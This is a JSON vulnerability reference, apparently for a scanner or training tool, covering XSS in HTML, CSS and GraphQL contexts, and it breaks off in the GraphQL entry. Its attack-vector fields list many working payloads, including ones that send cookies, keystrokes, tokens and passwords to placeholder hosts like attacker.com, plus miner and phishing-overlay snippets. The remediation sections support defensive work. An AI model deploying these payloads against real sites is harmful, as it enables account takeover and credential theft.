{
  "html_content": {
    "title": "Cross-Site Scripting (XSS) in HTML Content",
    "severity": "critical",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "html",
      "reflected",
      "stored",
      "injection"
    ],
    "description": "\nUser input is reflected directly into the HTML body without proper sanitization. This is the most \nstraightforward and dangerous XSS vector, allowing injection of arbitrary HTML elements, scripts, \nand interactive content. It's the primary target for stored/persistent XSS attacks and can lead to \ncomplete account takeover, credential theft, and malware distribution.\n\nVULNERABILITY CONTEXT:\nWhen user-controlled data is inserted between HTML tags without encoding, attackers can inject \ntheir own HTML markup including script tags, event handlers, iframes, and other active content.\nThis is common in:\n- Comment systems\n- User profiles (bio, username display)\n- Blog posts and articles\n- Forum threads\n- Chat messages\n- Product reviews\n- Wiki pages\n- Email web clients\n- CMS content\n- Search result pages\n\nSEVERITY: CRITICAL\nThis vulnerability consistently ranks in OWASP Top 10 and is the foundation for most XSS attacks.\n",
    "attack_vector": "\nCLASSIC ATTACK VECTORS:\n\n1. SCRIPT TAG INJECTION:\n   <script>alert(document.cookie)</script>\n   <script>fetch('//attacker.com/steal?c='+document.cookie)</script>\n   <script src=\"//evil.com/xss.js\"></script>\n   \n2. IMG TAG WITH ONERROR:\n   <img src=x onerror=alert(1)>\n   <img src=x onerror=\"fetch('//attacker.com?c='+btoa(document.cookie))\">\n   <img/src=x onerror=eval(atob('YWxlcnQoMSk='))>\n\n3. SVG ONLOAD:\n   <svg onload=alert(1)>\n   <svg/onload=alert`1`>\n   <svg><script>alert(1)</script></svg>\n   <svg><animate onbegin=alert(1) attributeName=x dur=1s>\n\n4. IFRAME INJECTION:\n   <iframe src=javascript:alert(1)>\n   <iframe srcdoc=\"<script>alert(1)</script>\">\n   <iframe src=\"data:text/html,<script>alert(1)</script>\">\n\n5. BODY/HTML EVENT HANDLERS:\n   <body onload=alert(1)>\n   <body onpageshow=alert(1)>\n   <body onfocus=alert(1)>\n\n6. INPUT/FORM AUTOFOCUS:\n   <input onfocus=alert(1) autofocus>\n   <select onfocus=alert(1) autofocus>\n   <textarea onfocus=alert(1) autofocus>\n   <keygen onfocus=alert(1) autofocus>\n\n7. DETAILS/SUMMARY (HTML5):\n   <details open ontoggle=alert(1)>\n   <details><summary>Click</summary><script>alert(1)</script></details>\n\n8. VIDEO/AUDIO TAGS:\n   <video><source onerror=alert(1)>\n   <audio src=x onerror=alert(1)>\n   <video poster=javascript:alert(1)>\n\n9. MARQUEE/BLINK:\n   <marquee onstart=alert(1)>XSS</marquee>\n   <marquee loop=1 width=0 onfinish=alert(1)>\n\n10. OBJECT/EMBED:\n    <object data=\"javascript:alert(1)\">\n    <embed src=\"javascript:alert(1)\">\n    <object data=\"data:text/html,<script>alert(1)</script>\">\n\nMODERN BYPASSES AND ADVANCED TECHNIQUES:\n\n11. MUTATION XSS (mXSS):\n    Payloads that look safe but become dangerous after HTML parsing:\n    <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n    <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>\n\n12. DANGLING MARKUP INJECTION:\n    Used for data exfiltration when XSS is partially filtered:\n    <img src='//attacker.com/collect?\n    (Captures all following HTML until next single quote)\n\n13. HTML5 FORM HIJACKING:\n    <form action=\"//attacker.com\"><button>Click</button></form>\n    <input form=x><form id=x action=\"//evil.com\"><button>Submit</button></form>\n\n14. POLYGLOT VECTORS:\n    Works across multiple contexts (HTML, JS, etc):\n    javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>\n    jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e\n\n15. UNICODE/ENCODING BYPASSES:\n    <script>\\u0061lert(1)</script>\n    <script>\\x61lert(1)</script>\n    <script>eval('\\x61lert(1)')</script>\n    <img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">\n\n16. NULL BYTE INJECTION:\n    <script>alert(1)</script>%00\n    <img src=x%00 onerror=alert(1)>\n\n17. BREAKING OUT OF ATTRIBUTES:\n    If input is in: <div data-text=\"USER_INPUT\">\n    Payload: \"><script>alert(1)</script>\n    Result: <div data-text=\"\"><script>alert(1)</script>\">\n\n18. COMMENT BREAKOUT:\n    <!-- USER_INPUT -->\n    Payload: --><script>alert(1)</script><!--\n\n19. CSS EXPRESSION (Legacy IE):\n    <style>body{background:expression(alert(1))}</style>\n\n20. BASE TAG HIJACKING:\n    <base href=\"//attacker.com/\">\n    (Hijacks all relative URLs on page)\n\nREAL-WORLD ATTACK SCENARIOS:\n\nSESSION HIJACKING:\n<script>\nnew Image().src='//attacker.com/steal?c='+document.cookie;\n</script>\n\nKEYLOGGER:\n<script>\ndocument.onkeypress=function(e){\n  fetch('//attacker.com/log?k='+e.key);\n}\n</script>\n\nPHISHING:\n<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\">\n  <form action=\"//attacker.com/phish\">\n    <h2>Session Expired - Please Login</h2>\n    <input name=\"user\" placeholder=\"Username\">\n    <input name=\"pass\" type=\"password\" placeholder=\"Password\">\n    <button>Login</button>\n  </form>\n</div>\n\nCRYPTOCURRENCY MINER:\n<script src=\"//attacker.com/coinhive.js\"></script>\n<script>\nvar miner=new CoinHive.Anonymous('attacker-key');\nminer.start();\n</script>\n\nDEFACEMENT:\n<script>\ndocument.body.innerHTML='<h1>Hacked by Attacker</h1>';\n</script>\n\nBROWSER EXPLOITATION:\n<script src=\"//attacker.com/browser-exploit.js\"></script>\n\nOAUTH TOKEN THEFT:\n<script>\nvar token=localStorage.getItem('oauth_token');\nfetch('//attacker.com/steal?t='+token);\n</script>\n\nCSRF TOKEN EXFILTRATION:\n<script>\nvar csrf=document.querySelector('[name=csrf_token]').value;\nfetch('//attacker.com/csrf?t='+csrf);\n</script>\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. OUTPUT ENCODING (PRIMARY DEFENSE):\n   \n   HTML Entity Encoding:\n   Convert: < > & \" '\n   To:      &lt; &gt; &amp; &quot; &#x27;\n   \n   Python Example:\n   import html\n   safe_output = html.escape(user_input, quote=True)\n   \n   PHP Example:\n   $safe_output = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');\n   \n   JavaScript Example:\n   function escapeHtml(text) {\n     const map = {\n       '&': '&amp;',\n       '<': '&lt;',\n       '>': '&gt;',\n       '\"': '&quot;',\n       \"'\": '&#x27;'\n     };\n     return text.replace(/[&<>\"']/g, m => map[m]);\n   }\n\n2. CONTENT SECURITY POLICY (CSP):\n   \n   Strict CSP (Recommended):\n   Content-Security-Policy: \n     default-src 'self'; \n     script-src 'nonce-{random}' 'strict-dynamic'; \n     object-src 'none'; \n     base-uri 'none';\n   \n   Then in HTML:\n   <script nonce=\"{random}\">\n     // Safe inline script\n   </script>\n   \n   CSP with hashes:\n   Content-Security-Policy: \n     script-src 'sha256-{hash-of-script}'\n\n3. USE SAFE APIS:\n   \n   SAFE (Use these):\n   - textContent\n   - innerText\n   - setAttribute()\n   - createTextNode()\n   \n   DANGEROUS (Avoid):\n   - innerHTML\n   - outerHTML\n   - document.write()\n   - insertAdjacentHTML()\n   \n   Example:\n   // BAD:\n   element.innerHTML = userInput;\n   \n   // GOOD:\n   element.textContent = userInput;\n\n4. MODERN FRAMEWORK PROTECTION:\n   \n   React (Safe by default):\n   function Component({ userInput }) {\n     return <div>{userInput}</div>; // Auto-escaped\n   }\n   \n   // DANGEROUS:\n   <div dangerouslySetInnerHTML={{__html: userInput}} />\n   \n   Vue (Safe by default):\n   <template>\n     <div>{{ userInput }}</div> <!-- Auto-escaped -->\n   </template>\n   \n   // DANGEROUS:\n   <div v-html=\"userInput\"></div>\n   \n   Angular (Safe by default):\n   <div>{{ userInput }}</div> <!-- Auto-escaped -->\n   \n   // DANGEROUS:\n   <div [innerHTML]=\"userInput\"></div>\n\n5. HTML SANITIZATION:\n   \n   When rich HTML is required, use battle-tested libraries:\n   \n   JavaScript (DOMPurify):\n   import DOMPurify from 'dompurify';\n   const clean = DOMPurify.sanitize(dirty);\n   \n   Python (Bleach):\n   import bleach\n   clean = bleach.clean(\n     dirty,\n     tags=['b', 'i', 'u', 'em', 'strong', 'a'],\n     attributes={'a': ['href', 'title']},\n     protocols=['http', 'https', 'mailto']\n   )\n   \n   Java (OWASP Java HTML Sanitizer):\n   PolicyFactory policy = new HtmlPolicyBuilder()\n     .allowElements(\"b\", \"i\", \"u\")\n     .allowAttributes(\"href\").onElements(\"a\")\n     .allowStandardUrlProtocols()\n     .toFactory();\n   String safeHTML = policy.sanitize(untrustedHTML);\n\n6. TRUSTED TYPES API (Modern Browsers):\n   \n   Enforce at policy level:\n   Content-Security-Policy: require-trusted-types-for 'script'\n   \n   JavaScript:\n   const policy = trustedTypes.createPolicy('myPolicy', {\n     createHTML: (string) => {\n       // Sanitize here\n       return DOMPurify.sanitize(string);\n     }\n   });\n   \n   element.innerHTML = policy.createHTML(userInput);\n\n7. INPUT VALIDATION:\n   \n   Whitelist approach:\n   - Define what is allowed\n   - Reject everything else\n   \n   Example for username:\n   const USERNAME_REGEX = /^[a-zA-Z0-9_-]{3,20}$/;\n   if (!USERNAME_REGEX.test(username)) {\n     throw new Error('Invalid username');\n   }\n\n8. HTTPONLY & SECURE COOKIES:\n   \n   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n   \n   HttpOnly: Prevents JavaScript access to cookie\n   Secure: Only sent over HTTPS\n   SameSite: Prevents CSRF\n\n9. X-XSS-PROTECTION HEADER:\n   \n   X-XSS-Protection: 1; mode=block\n   \n   Note: Deprecated in modern browsers that support CSP\n\n10. X-CONTENT-TYPE-OPTIONS:\n    \n    X-Content-Type-Options: nosniff\n    \n    Prevents MIME-sniffing attacks\n\nSECURITY CHECKLIST:\n\n[ ] All user input is HTML entity encoded before output\n[ ] CSP is implemented with nonce or hash\n[ ] Using framework auto-escaping (not bypassed)\n[ ] No innerHTML/document.write with user data\n[ ] HTML sanitization library if rich content needed\n[ ] HTTPOnly flag on all session cookies\n[ ] Secure flag on cookies (HTTPS only)\n[ ] SameSite attribute on cookies\n[ ] Input validation with whitelist\n[ ] Regular security testing (automated + manual)\n[ ] Security code review for all user input handling\n[ ] Trusted Types API enabled (if browser support available)\n[ ] WAF as additional layer (not primary defense)\n[ ] Security headers configured (CSP, X-Content-Type-Options)\n[ ] Developer security training completed\n\nTESTING PAYLOADS:\n\nBasic detection:\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nFilter bypass:\n<ScRiPt>alert(1)</ScRiPt>\n<img src=x onerror=alert`1`>\n<svg/onload=alert(1)>\n\nEncoding:\n&lt;script&gt;alert(1)&lt;/script&gt;\n\\x3cscript\\x3ealert(1)\\x3c/script\\x3e\n\nOWASP REFERENCES:\n- OWASP Top 10: A03:2021 - Injection\n- CWE-79: Improper Neutralization of Input During Web Page Generation\n- OWASP XSS Prevention Cheat Sheet\n- OWASP Testing Guide: Testing for Reflected XSS\n- OWASP Testing Guide: Testing for Stored XSS\n"
  },
  "css_context": {
    "title": "Cross-Site Scripting (XSS) in CSS Context",
    "severity": "high",
    "cvss_score": 7.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "css",
      "style",
      "injection",
      "modern-web"
    ],
    "description": "\nUser input is reflected within a stylesheet or a style attribute. While modern browsers have mitigated \nmany classic CSS attack vectors, new techniques continue to emerge. CSS injection can lead to data \nexfiltration, UI redressing, clickjacking, and in some cases script execution through CSS-based \nkeyloggers, attribute selectors for password stealing, and advanced timing attacks.\n\nVULNERABILITY CONTEXT:\nOccurs when user input is embedded in CSS:\n- <style>body {background: USER_INPUT}</style>\n- <div style=\"USER_INPUT\">content</div>\n- CSS files generated from user input\n- CSS-in-JS with unescaped values\n- Custom CSS properties (CSS variables)\n- @import rules with user URLs\n- @font-face with user sources\n- Inline styles from server-side rendering\n- CSS preprocessors (SASS, LESS) with user input\n- Style injection in SPA applications\n\nCommon in:\n- Theming systems\n- User profile customization\n- Admin panels with CSS editors\n- Email clients (HTML emails)\n- Markdown renderers\n- WYSIWYG editors\n- CSS frameworks with dynamic generation\n\nSEVERITY: MEDIUM to HIGH\nCan lead to credential theft, data exfiltration, phishing, and UI-based attacks.\nGrowing threat with modern CSS features and attribute selectors.\n",
    "attack_vector": "\nLEGACY ATTACK VECTORS (Still work in old browsers):\n\n1. IE EXPRESSION():\n   <style>div {background: expression(alert(1))}</style>\n   <style>div {width: expression(alert(document.cookie))}</style>\n   \n   Affects: IE 5-7\n   Executes JavaScript in CSS\n\n2. -MOZ-BINDING (Firefox):\n   <style>\n   div {-moz-binding: url(\"data:text/xml,<?xml version='1.0'?><bindings xmlns='http://www.mozilla.org/xbl'><binding id='x'><implementation><constructor>alert(1)</constructor></implementation></binding></bindings>\");}\n   </style>\n   \n   Affects: Firefox < 4\n\n3. BEHAVIOR (IE):\n   <style>\n   div {behavior: url(xss.htc);}\n   </style>\n   \n   Affects: IE 5-9\n\nMODERN CSS DATA EXFILTRATION:\n\n4. CSS KEYLOGGER (Attribute Selectors):\n   Steal form input character by character:\n   \n   <style>\n   input[name=\"password\"][value^=\"a\"] {\n       background: url(https://attacker.com/log?char=a);\n   }\n   input[name=\"password\"][value^=\"b\"] {\n       background: url(https://attacker.com/log?char=b);\n   }\n   /* ... for all characters */\n   input[name=\"password\"][value^=\"aa\"] {\n       background: url(https://attacker.com/log?char=aa);\n   }\n   /* ... exponential combinations */\n   </style>\n   \n   Exfiltrates password as user types!\n\n5. CSS HISTORY SNIFFING (Patched but variants exist):\n   <style>\n   a[href=\"https://bank.com\"]:visited {\n       background: url(https://attacker.com/visited?site=bank);\n   }\n   </style>\n   \n   Detects visited links (browsers now limit this)\n\n6. TOKEN/SECRET EXTRACTION:\n   Extract CSRF tokens, API keys from page:\n   \n   <style>\n   input[name=\"csrf_token\"][value^=\"a\"] {\n       background: url(https://attacker.com/csrf?t=a);\n   }\n   /* Full token extraction through combinations */\n   </style>\n\n7. USERNAME ENUMERATION:\n   <style>\n   #username[value=\"admin\"] {\n       background: url(https://attacker.com/user?name=admin);\n   }\n   </style>\n\nFONT-FACE UNICODE RANGE ATTACKS:\n\n8. CHARACTER DETECTION:\n   Detect specific characters in page content:\n   \n   <style>\n   @font-face {\n       font-family: \"leak\";\n       src: url(\"https://attacker.com/leak?char=a\");\n       unicode-range: U+0061; /* 'a' */\n   }\n   @font-face {\n       font-family: \"leak\";\n       src: url(\"https://attacker.com/leak?char=b\");\n       unicode-range: U+0062; /* 'b' */\n   }\n   body {\n       font-family: \"leak\";\n   }\n   </style>\n   \n   Browser loads font only if character is present!\n\n9. SENSITIVE DATA DETECTION:\n   Detect credit card numbers, SSN patterns:\n   \n   <style>\n   @font-face {\n       font-family: \"detect\";\n       src: url(\"https://attacker.com/found?pattern=creditcard\");\n       unicode-range: U+0030-0039; /* digits 0-9 */\n   }\n   </style>\n\n@IMPORT ATTACKS:\n\n10. JAVASCRIPT PROTOCOL (Legacy):\n    <style>@import 'javascript:alert(1)';</style>\n    \n    Affects: Very old browsers\n\n11. EXTERNAL CSS INJECTION:\n    <style>@import url(https://attacker.com/evil.css);</style>\n    \n    Loads attacker's CSS with more attacks\n\n12. DATA URL IMPORT:\n    <style>@import url(\"data:text/css,body{background:red}\");</style>\n    \n    Can contain encoded malicious CSS\n\nSTYLE ATTRIBUTE BREAKOUT:\n\n13. BREAKING OUT OF STYLE:\n    <div style=\"color: USER_INPUT\">\n    \n    Payload:\n    red}body{background:url(//attacker.com/track)\n    \n    Result:\n    <div style=\"color: red}body{background:url(//attacker.com/track)\">\n    \n    Or:\n    red\"></div><script>alert(1)</script><div style=\"color:red\n\n14. EVENT HANDLER VIA STYLE BREAK:\n    <div style=\"USER_INPUT\">\n    \n    Payload:\n    x\" onload=\"alert(1)\" x=\"\n    \n    Result:\n    <div style=\"x\" onload=\"alert(1)\" x=\"\">\n\n15. CLOSING TAG VIA STYLE:\n    Payload:\n    x\"></div><img src=x onerror=alert(1)><div style=\"x\n\nURL() FUNCTION EXPLOITATION:\n\n16. BACKGROUND URL:\n    <style>div {background: url(USER_INPUT)}</style>\n    \n    Payloads:\n    https://attacker.com/track\n    //attacker.com/track\n    \n    Track when element is rendered\n\n17. DYNAMIC URL WITH ATTR():\n    <style>\n    div::before {\n        content: url(\"https://attacker.com/track?data=\" attr(data-secret));\n    }\n    </style>\n    \n    Exfiltrates data-secret attribute value\n\n18. CONDITIONAL URL LOADING:\n    <style>\n    @media screen and (min-width: 800px) {\n        body {\n            background: url(https://attacker.com/screen?size=large);\n        }\n    }\n    </style>\n    \n    Fingerprint screen size\n\nCSS TIMING ATTACKS:\n\n19. RESOURCE TIMING:\n    Load slow resources to measure timing:\n    \n    <style>\n    input[value^=\"a\"] {\n        background: url(https://attacker.com/slow?char=a);\n    }\n    </style>\n    \n    Time how long page takes to load → deduce password\n\n20. ANIMATION TIMING:\n    <style>\n    @keyframes leak {\n        from {background: url(https://attacker.com/start)}\n        to {background: url(https://attacker.com/end)}\n    }\n    input[value^=\"a\"] {\n        animation: leak 1s;\n    }\n    </style>\n\nUI REDRESSING AND PHISHING:\n\n21. OVERLAY ATTACK:\n    <style>\n    .malicious {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background: white;\n        z-index: 999999;\n    }\n    .malicious::before {\n        content: \"Session Expired - Please Login\";\n        font-size: 24px;\n        display: block;\n        padding: 20px;\n    }\n    </style>\n\n22. CLICKJACKING VIA CSS:\n    <style>\n    .real-button {\n        opacity: 0;\n        position: absolute;\n        z-index: 1;\n    }\n    .fake-button {\n        position: absolute;\n        z-index: 0;\n    }\n    </style>\n    \n    User clicks fake button, activates real hidden button\n\n23. CONTENT INJECTION:\n    <style>\n    .message::before {\n        content: \"URGENT: Wire transfer required to account: 123456789\";\n        color: red;\n        font-size: 20px;\n    }\n    </style>\n\nSCROLL-TO-TEXT ATTACKS:\n\n24. SCROLL BASED EXFILTRATION:\n    <style>\n    :target {\n        background: url(https://attacker.com/scroll?target=found);\n    }\n    </style>\n    \n    Detect URL fragments\n\n25. SCROLL POSITION TRACKING:\n    <style>\n    body::-webkit-scrollbar-thumb {\n        background: url(https://attacker.com/scrolling);\n    }\n    </style>\n\nCSS INJECTION IN STYLE ATTRIBUTE:\n\n26. PROPERTY INJECTION:\n    <div style=\"color: USER_INPUT\">\n    \n    Payloads:\n    red; background: url(//evil.com)\n    red; position: fixed; top: 0; z-index: 999999\n    red; opacity: 0\n\n27. IMPORTANT OVERRIDE:\n    Payload:\n    red !important; background: url(//evil.com) !important\n\n28. MULTIPLE PROPERTIES:\n    Payload:\n    red; background: white; border: 1px solid red; padding: 1000px\n\nCSS VARIABLES (Custom Properties):\n\n29. CSS VAR INJECTION:\n    <style>\n    :root {\n        --user-color: USER_INPUT;\n    }\n    div {\n        background: var(--user-color);\n    }\n    </style>\n    \n    Payload:\n    url(https://attacker.com/track)\n\n30. VAR WITH FALLBACK:\n    <style>\n    div {\n        color: var(--user-input, url(//evil.com/fallback));\n    }\n    </style>\n\nCSS-IN-JS EXPLOITATION:\n\n31. STYLED-COMPONENTS:\n    const UserDiv = styled.div`\n        color: ${userInput};\n    `;\n    \n    Payload:\n    red}body{background:url(//evil.com)\n\n32. EMOTION/GLAMOR:\n    css`\n        color: ${userInput};\n    `\n    \n    Same injection techniques apply\n\n33. JSS (JavaScript Style Sheets):\n    const styles = {\n        myDiv: {\n            color: userInput // If not sanitized\n        }\n    }\n\nFILTER BYPASSES:\n\n34. CASE VARIATIONS:\n    ExPrEsSiOn(alert(1))\n    uRl(javascript:alert(1))\n\n35. ENCODING:\n    \\75rl(javascript:alert(1))  // \\75 = 'u'\n    \\65xpression(alert(1))  // \\65 = 'e'\n\n36. COMMENTS:\n    exp/*comment*/ression(alert(1))\n    u/**/rl(//evil.com)\n\n37. NULL BYTES:\n    expression\\00(alert(1))\n    url\\00(javascript:alert(1))\n\n38. WHITESPACE:\n    expression\\20(alert(1))  // \\20 = space\n    expression\\09(alert(1))  // \\09 = tab\n\nREAL-WORLD ATTACK SCENARIOS:\n\nPASSWORD EXFILTRATION:\nGenerate CSS for all character combinations:\n<style>\ninput[type=\"password\"][value^=\"a\"] {\n    background-image: url(https://attacker.com/pw?c=a);\n}\ninput[type=\"password\"][value^=\"b\"] {\n    background-image: url(https://attacker.com/pw?c=b);\n}\n/* ... continue for all chars and combinations ... */\n</style>\n\nCSRF TOKEN THEFT:\n<style>\ninput[name=\"csrf\"][value^=\"abc\"] {\n    background: url(https://attacker.com/csrf?t=abc);\n}\n/* Full token extracted through iteration */\n</style>\n\nUSER TRACKING:\n<style>\nbody {\n    background: url(https://attacker.com/track?user=logged_in);\n}\n@media (min-width: 1920px) {\n    body::after {\n        content: url(https://attacker.com/screen?w=1920);\n    }\n}\n</style>\n\nPHISHING OVERLAY:\n<style>\nbody::before {\n    content: \"\";\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    background: white;\n    z-index: 999999;\n}\nbody::after {\n    content: \"Your session has expired. Click here to login: https://fake-login.com\";\n    position: fixed;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    z-index: 1000000;\n    font-size: 18px;\n    text-align: center;\n}\n</style>\n",
    "remediation": "\nDEFENSE-IN-DEPTH STRATEGY:\n\n1. NEVER PLACE UNTRUSTED INPUT IN CSS:\n   \n   BAD:\n   <style>div {color: <?php echo $user_color ?>}</style>\n   <div style=\"background: <?php echo $user_bg ?>\">\n   \n   GOOD:\n   Use predefined CSS classes:\n   <div class=\"theme-<?php echo htmlspecialchars($safe_theme_id) ?>\">\n\n2. STRICT CSS CHARACTER ESCAPING:\n   \n   Escape these characters:\n   - { } ; : ( ) \" ' \\ / < > & = + * ! @ # $ % ^ `\n   \n   Python:\n   import re\n   def escape_css(text):\n       # Allow only safe characters\n       return re.sub(r'[^a-zA-Z0-9\\s\\-]', '', text)\n   \n   PHP:\n   function escape_css($text) {\n       return preg_replace('/[^a-zA-Z0-9\\s\\-]/', '', $text);\n   }\n   \n   JavaScript:\n   function escapeCSS(text) {\n       return text.replace(/[^a-zA-Z0-9\\s\\-]/g, '');\n   }\n\n3. WHITELIST APPROACH:\n   \n   For colors:\n   $allowed_colors = ['red', 'blue', 'green', 'black', 'white'];\n   if (!in_array($user_color, $allowed_colors)) {\n       $user_color = 'black'; // Default\n   }\n   \n   For URLs:\n   if (!preg_match('/^https:\\/\\/trusted-domain\\.com\\//', $url)) {\n       die('Invalid URL');\n   }\n\n4. CONTENT SECURITY POLICY:\n   \n   Restrict inline styles:\n   Content-Security-Policy: \n     style-src 'self' 'nonce-RANDOM123';\n   \n   Block external stylesheets:\n   Content-Security-Policy:\n     style-src 'self';\n   \n   No inline styles at all:\n   Content-Security-Policy:\n     style-src 'self';  // No 'unsafe-inline'\n\n5. CSS SANITIZATION LIBRARIES:\n   \n   JavaScript (DOMPurify with CSS):\n   import DOMPurify from 'dompurify';\n   const clean = DOMPurify.sanitize(dirty, {\n       ALLOWED_TAGS: ['style'],\n       ALLOWED_ATTR: []\n   });\n   \n   Python (Bleach):\n   import bleach\n   from bleach.css_sanitizer import CSSSanitizer\n   \n   css_sanitizer = CSSSanitizer(\n       allowed_css_properties=['color', 'background-color'],\n       allowed_protocols=['https']\n   )\n   clean = bleach.clean(\n       dirty,\n       tags=['style'],\n       css_sanitizer=css_sanitizer\n   )\n\n6. BLOCK DANGEROUS CSS PROPERTIES:\n   \n   Dangerous properties to remove/block:\n   - expression (IE)\n   - behavior (IE)\n   - -moz-binding (Firefox)\n   - @import\n   - @font-face (in user CSS)\n   - url() with javascript:, data:, vbscript:\n   - position: fixed (for overlays)\n   - opacity: 0 (for clickjacking)\n   - z-index > reasonable value\n\n7. VALIDATE CSS VALUES:\n   \n   For colors (hex):\n   if (!preg_match('/^#[0-9A-Fa-f]{6}$/', $color)) {\n       $color = '#000000';\n   }\n   \n   For colors (rgb):\n   if (!preg_match('/^rgb\\(\\d{1,3},\\d{1,3},\\d{1,3}\\)$/', $color)) {\n       $color = 'rgb(0,0,0)';\n   }\n   \n   For dimensions:\n   if (!preg_match('/^\\d+px$/', $size)) {\n       $size = '0px';\n   }\n\n8. CSS-IN-JS PROTECTION:\n   \n   Styled-components (use CSS prop safely):\n   const UserDiv = styled.div`\n     color: ${props => CSS.escape(props.userColor)};\n   `;\n   \n   Or use style object (safer):\n   <div style={{\n     color: sanitizeColor(userInput)  // Validate first\n   }}>\n   \n   Emotion:\n   const styles = css`\n     color: ${CSS.escape(userColor)};\n   `;\n\n9. DISABLE ATTRIBUTE SELECTORS (If possible):\n   \n   In controlled environments, restrict CSS features:\n   - No [attribute^=value] selectors\n   - No @font-face in user CSS\n   - No url() in user CSS\n   - No @import\n\n10. INPUT VALIDATION:\n    \n    For theme selection:\n    $theme_id = intval($_POST['theme']);\n    if ($theme_id < 1 || $theme_id > 10) $theme_id = 1;\n    \n    For custom colors:\n    - Accept only hex colors: #RRGGBB\n    - OR provide color picker with limited palette\n    - Never allow raw CSS\n\nSECURITY CHECKLIST:\n\n[ ] No user input placed directly in <style> tags\n[ ] No user input in style attributes without escaping\n[ ] CSS character escaping implemented\n[ ] Whitelist approach for colors/values\n[ ] CSP configured to restrict inline styles\n[ ] CSS sanitization library used (DOMPurify, Bleach)\n[ ] Dangerous CSS properties blocked\n[ ] URL validation for background/import\n[ ] No expression, behavior, -moz-binding allowed\n[ ] Attribute selectors restricted (prevent keyloggers)\n[ ] @font-face controlled or blocked\n[ ] CSS-in-JS properly escaped\n[ ] Input validation for expected formats\n[ ] Regular security testing\n[ ] Code review for all CSS generation\n\nTESTING PAYLOADS:\n\nStyle breakout:\nred}body{background:url(//evil.com)\nred\"></div><img src=x onerror=alert(1)><div x=\"\n\nAttribute selector:\ninput[value^=\"a\"] {background: url(//evil.com?c=a)}\n\nFont-face:\n@font-face {src: url(//evil.com)}\n\nImport:\n@import url(//evil.com/evil.css)\n\nExpression (legacy):\nexpression(alert(1))\n\nURL injection:\nurl(javascript:alert(1))\nurl(data:text/html,<script>alert(1)</script>)\n\nTOOLS:\n- CSP Evaluator: https://csp-evaluator.withgoogle.com/\n- DOMPurify: https://github.com/cure53/DOMPurify\n- Bleach: https://github.com/mozilla/bleach\n- CSS Sanitizer spec: https://drafts.csswg.org/css-syntax-3/\n\nRESEARCH REFERENCES:\n- \"CSS Injection Primitives\" by Gareth Heyes\n- \"CSS Exfiltration\" by Mike Gualtieri\n- \"CSS Keylogger\" by Max Chehab\n- \"Stealing Data with CSS\" by Michele Spagnuolo\n- OWASP XSS Prevention Cheat Sheet\n\nCVE REFERENCES:\n- CVE-2019-8773: Safari CSS expression\n- CVE-2021-21290: CSS injection in Netty\n- Various CSS injection in email clients\n\nOWASP REFERENCES:\n- OWASP XSS Prevention Cheat Sheet: Rule #4\n- CWE-79: Cross-site Scripting\n- CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n"
  },
  "graphql_xss": {
    "title": "Cross-Site Scripting (XSS) in GraphQL Context",
    "severity": "high",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "graphql",
      "api-injection",
      "query-manipulation",
      "modern-web"
    ],
    "description": "\nGraphQL XSS occurs when user input is reflected into GraphQL queries, mutations, or responses\nwithout proper sanitization. GraphQL is a query language for APIs that provides flexible data\nfetching capabilities. When malicious content is injected into GraphQL operations or when\nquery results are displayed without sanitization, it can lead to XSS attacks through API responses.\n\nVULNERABILITY CONTEXT:\nGraphQL XSS typically happens when:\n1. Query parameters contain malicious content\n2. Mutation inputs are reflected in responses\n3. Introspection queries return dangerous data\n4. Subscription updates contain user-controlled content\n5. Error messages leak sensitive information\n6. Field aliases contain executable content\n\nCommon in:\n- GraphQL API implementations\n- React/Apollo applications\n- API gateways\n- Headless CMS systems\n- E-commerce platforms\n- Social media APIs\n- Mobile applications with GraphQL\n\nSEVERITY: HIGH\nGraphQL XSS can affect multiple clients consuming the same API and can lead to persistent attacks\nthrough cached responses and subscriptions. The flexible nature of GraphQL makes comprehensive\nsanitization challenging.\n",
